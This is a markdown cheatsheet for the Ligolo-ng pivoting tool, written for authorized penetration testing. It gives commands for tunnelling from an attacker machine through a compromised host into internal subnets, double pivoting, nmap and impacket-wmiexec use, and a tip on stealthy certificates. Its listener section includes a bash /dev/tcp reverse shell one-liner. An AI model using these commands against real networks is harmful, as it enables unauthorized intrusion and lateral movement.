# 🔀 Ligolo-ng - Complete Cheatsheet

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)

```
  ██╗     ██╗ ██████╗  ██████╗ ██╗      ██████╗      ███╗   ██╗ ██████╗ 
  ██║     ██║██╔════╝ ██╔═══██╗██║     ██╔═══██╗     ████╗  ██║██╔════╝ 
  ██║     ██║██║  ███╗██║   ██║██║     ██║   ██║     ██╔██╗ ██║██║  ███╗
  ██║     ██║██║   ██║██║   ██║██║     ██║   ██║     ██║╚██╗██║██║   ██║
  ███████╗██║╚██████╔╝╚██████╔╝███████╗╚██████╔╝     ██║ ╚████║╚██████╔╝
  ╚══════╝╚═╝ ╚═════╝  ╚═════╝ ╚══════╝ ╚═════╝      ╚═╝  ╚═══╝ ╚═════╝ 
                 Advanced TUN-based Pivoting Tool
```

<p align="center">
  <img src="https://img.shields.io/badge/Ligolo--ng-Pivoting-blue?style=for-the-badge" alt="Ligolo-ng">
  <img src="https://img.shields.io/badge/TUN_Interface-VPN_Style-green?style=for-the-badge" alt="TUN Interface">
  <img src="https://img.shields.io/badge/Go-Cross_Platform-orange?style=for-the-badge" alt="Go">
  <img src="https://img.shields.io/badge/Network_Pivoting-red?style=for-the-badge" alt="Network Pivoting">
</p>

<p align="center">
  <b>🌐 Modern, simple, and high-performance pivoting tool using TUN interfaces instead of SOCKS proxies</b>
</p>

---

## 📋 Table of Contents

- [Introduction](#-introduction)
- [Why Ligolo-ng? (Ligolo-ng vs SOCKS/Proxychains)](#-why-ligolo-ng)
- [Architecture & How It Works](#-architecture--how-it-works)
- [Installation](#-installation)
- [Quick Start Guide](#-quick-start-guide)
  - [Step 1: Setup TUN Interface on Attacker](#step-1-setup-tun-interface-on-attacker)
  - [Step 2: Start the Ligolo-ng Proxy](#step-2-start-the-ligolo-ng-proxy)
  - [Step 3: Deploy the Agent on Pivot Target](#step-3-deploy-the-agent-on-pivot-target)
  - [Step 4: Configure Routing on Attacker](#step-4-configure-routing-on-attacker)
  - [Step 5: Start the Tunnel Session](#step-5-start-the-tunnel-session)
- [Reverse Port Forwarding (Listeners)](#-reverse-port-forwarding-listeners)
- [Double Pivoting (Multi-Tier Pivoting)](#-double-pivoting-multi-tier-pivoting)
- [Proxy Interactive Commands Reference](#-proxy-interactive-commands-reference)
- [Agent Command-Line Options](#-agent-command-line-options)
- [Troubleshooting & Best Practices](#-troubleshooting--best-practices)
- [Legal Disclaimer](#-legal-disclaimer)
- [Resources](#-resources)

---

## 🎯 Introduction

**Ligolo-ng** is an advanced, lightweight, and fast tunneling and pivoting tool written in Go. Unlike traditional SOCKS proxies (such as standard Chisel or SSH dynamic forwarding), Ligolo-ng establishes a virtual **TUN interface** directly on your attacker machine.

This turns your compromised pivot host into a true VPN-like gateway: all tools on your attacker machine (including `nmap -sS`, `crackmapexec`, `evil-winrm`, `impacket`, and browsers) can access internal subnets directly by IP address without prefixing commands with `proxychains`.

---

## ⚖️ Why Ligolo-ng?

| Feature | Ligolo-ng | Proxychains + SOCKS | SSH SOCKS (`-D`) |
|---------|-----------|---------------------|------------------|
| **Protocol Support** | Full TCP & UDP | TCP only (poor UDP) | TCP only |
| **Nmap SYN Scan (`-sS`)**| ✅ Yes (Native) | ❌ No (Requires TCP `-sT`) | ❌ No |
| **Tool Compatibility** | 100% (Kernel IP stack) | Inconsistent (LD_PRELOAD) | Inconsistent |
| **Speed & Latency** | ⭐⭐⭐⭐⭐ Very Fast | ⭐⭐⭐ Moderate | ⭐⭐⭐ Moderate |
| **No SOCKS Wrapper** | ✅ Yes | ❌ Requires wrapper | ❌ Requires wrapper |
| **Reverse Listeners** | ✅ Built-in | ❌ Requires separate tool | ❌ Limited |

---

## 🏗️ Architecture & How It Works

```
+-------------------+                          +---------------------+                          +----------------------+
|  Attacker Machine |                          | Pivot Target (Host) |                          | Internal Subnet Host |
| (192.168.1.100)   |                          | (Dual-homed)        |                          | (172.16.1.50)        |
|                   |                          |                     |                          |                      |
| [proxy server]    | <=== TLS Tunnel =======> | [ligolo agent]      |                          |                      |
|    ^              |      (Port 11601)        |    |                |                          |                      |
|    |              |                          |    |                |                          |                      |
| [tun0 interface]  |                          |    +--------------->| == Internal Traffic ===> | [Target Service]     |
| (172.16.1.0/24)   |                          |     (172.16.1.10)   |                          | (Port 445, 80, etc.) |
+-------------------+                          +---------------------+                          +----------------------+
```

1. **Proxy:** Runs on your attacker machine, manages sessions, and bridges packets between your virtual TUN interface and connected agents.
2. **Agent:** A lightweight binary executed on the compromised internal machine (Linux, Windows, macOS, or ARM).
3. **TUN Interface:** A software loopback network interface created on Linux that routes traffic destined for internal subnets straight into Ligolo.

---

## 📥 Installation

Download the latest release binaries for both **proxy** and **agent** from the official GitHub Releases page:

```bash
# Download latest proxy for Linux
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.2-alpha/ligolo-ng_proxy_0.7.2-alpha_linux_amd64.tar.gz
tar -zxvf ligolo-ng_proxy_0.7.2-alpha_linux_amd64.tar.gz -C /opt/ligolo-proxy/

# Download agents for various targets
# Linux Agent
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.2-alpha/ligolo-ng_agent_0.7.2-alpha_linux_amd64.tar.gz
tar -zxvf ligolo-ng_agent_0.7.2-alpha_linux_amd64.tar.gz -C /opt/ligolo-agents/linux/

# Windows Agent
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.2-alpha/ligolo-ng_agent_0.7.2-alpha_windows_amd64.zip
unzip ligolo-ng_agent_0.7.2-alpha_windows_amd64.zip -d /opt/ligolo-agents/windows/
```

---

## 🚀 Quick Start Guide

### Step 1: Setup TUN Interface on Attacker

Before running the proxy, create a persistent TUN device on your Linux attacker machine:

```bash
# Create a TUN interface named "ligolo"
sudo ip tuntap add user $USER mode tun ligolo

# Bring the interface UP
sudo ip link set ligolo up

# Verify interface state
ip link show ligolo
```

### Step 2: Start the Ligolo-ng Proxy

Run the proxy using self-signed TLS certificates:

```bash
cd /opt/ligolo-proxy/
./proxy -self-cert -laddr 0.0.0.0:11601
```

> **Tip:** You can also provide valid Let's Encrypt certificates using `-certfile` and `-keyfile` for stealth in Red Team engagements.

### Step 3: Deploy the Agent on Pivot Target

Transfer the agent to your compromised host and execute it:

#### On Linux Target:
```bash
chmod +x agent
./agent -connect 192.168.1.100:11601 -ignore-cert
```

#### On Windows Target:
```powershell
.\agent.exe -connect 192.168.1.100:11601 -ignore-cert
```

### Step 4: Configure Routing on Attacker

Once the agent connects, inspect its network interfaces from the proxy console to determine the target's internal subnets (e.g., `172.16.1.0/24`).

On your **attacker terminal** (separate window), add a route pointing to the TUN interface:

```bash
# Route internal subnet through ligolo TUN device
sudo ip route add 172.16.1.0/24 dev ligolo

# Check route table
ip route show | grep ligolo
```

### Step 5: Start the Tunnel Session

In the interactive Ligolo-ng proxy prompt:

```text
ligolo-ng » session
? Select a session: 1 - user@PIVOT-HOST - 192.168.1.50:52418
[Agent : user@PIVOT-HOST] » start
[Agent : user@PIVOT-HOST] » INFO[0025] Tunnel started
```

Now you have direct, native IP access to the internal network! Test it:

```bash
# Ping internal host
ping -c 3 172.16.1.50

# Native Nmap SYN scan without proxychains!
nmap -sS -Pn -T4 -p 80,445,3389 172.16.1.50

# Run Impacket directly
impacket-wmiexec DOMAIN/admin:Password@172.16.1.50
```

---

## 🔄 Reverse Port Forwarding (Listeners)

Want to receive a reverse shell or catch an NTLM authentication relay on your attacker box from an internal host that cannot route back to your attacker IP? Use **listeners**!

When you configure a listener in Ligolo-ng, the agent opens a listening port on the **pivot machine** and relays incoming traffic back to your attacker machine.

### Example: Catching a Reverse Shell

Inside the proxy session:

```text
[Agent : user@PIVOT-HOST] » listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
INFO[0035] Listener created on 0.0.0.0:4444
```

On your **attacker machine**:

```bash
nc -lvnp 4444
```

On an **internal target** (`172.16.1.75`):

```bash
# Send reverse shell to the pivot host's internal IP
bash -i >& /dev/tcp/172.16.1.10/4444 0>&1
```

The pivot host forwards the connection straight to your Netcat listener!

---

## ⛓️ Double Pivoting (Multi-Tier Pivoting)

When accessing deeply nested networks (Subnet A -> Subnet B -> Subnet C):

1. Establish your initial tunnel to Pivot 1 (`172.16.1.10`).
2. Discover Pivot 2 located in Subnet B (`10.0.0.25`).
3. Set up a listener on Pivot 1 to forward traffic from Subnet B back to your proxy port `11601`:
   ```text
   [Agent : Pivot1] » listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
   ```
4. Deploy the Ligolo agent on Pivot 2 and connect to Pivot 1's IP:
   ```bash
   ./agent -connect 172.16.1.10:11601 -ignore-cert
   ```
5. A second session will appear in your proxy! Add a route for Subnet C:
   ```bash
   sudo ip route add 10.0.0.0/24 dev ligolo
   ```
6. Switch to session 2 and type `start`.

---

## ⌨️ Proxy Interactive Commands Reference

| Command | Description | Example |
|---------|-------------|---------|
| `session` | List and select active connected agent sessions | `session` |
| `start` | Start tunneling packets through the active agent | `start` |
| `stop` | Stop the active tunnel session | `stop` |
| `ifconfig` | Show network interfaces of the selected agent | `ifconfig` |
| `listener_add` | Create a listening port on the pivot agent | `listener_add --addr 0.0.0.0:8443 --to 127.0.0.1:8443` |
| `listener_list`| List all active listeners on current agent | `listener_list` |
| `listener_close`| Close a specific active listener | `listener_close --id 0` |
| `help` | Display command help | `help` |
| `exit` | Terminate proxy or return to main menu | `exit` |

---

## ⚙️ Agent Command-Line Options

| Flag | Description | Example |
|------|-------------|---------|
| `-connect` | Address and port of the Ligolo proxy | `-connect 192.168.1.100:11601` |
| `-ignore-cert` | Skip TLS certificate verification | `-ignore-cert` |
| `-retry` | Automatically retry connection if disconnected | `-retry` |
| `-auto-clear` | Clear terminal output upon execution | `-auto-clear` |

---

## 💡 Troubleshooting & Best Practices

1. **Delete TUN Interface After Engagement:**
   When finished with your test, clean up your routing table and delete the virtual interface:
   ```bash
   sudo ip link set ligolo down
   sudo ip tuntap del mode tun ligolo
   ```
2. **Double-Check IP Subnet Overlaps:**
   Ensure the internal subnet you are routing (e.g. `192.168.1.0/24`) does not collide with your local attacker network. If it overlaps, use a more specific `/32` host route (e.g., `sudo ip route add 192.168.1.50/32 dev ligolo`).
3. **Firewall Considerations on Pivot:**
   On Windows targets, ensure Windows Defender Firewall permits outgoing connections on port 11601 or your chosen listener port.
4. **Use `-retry` in Real Environments:**
   Always run agents with `-retry` to automatically re-establish connections after transient network drops.

---

## ⚠️ Legal Disclaimer

> **IMPORTANT:** Ligolo-ng is a powerful network routing utility. It must only be utilized during authorized penetration tests, red team engagements, and ethical security evaluations with explicit written consent.

---

## 📚 Resources

- [Official Ligolo-ng GitHub Repository](https://github.com/nicocha30/ligolo-ng)
- [Official Ligolo-ng Documentation](https://github.com/nicocha30/ligolo-ng/blob/master/DOCUMENTATION.md)
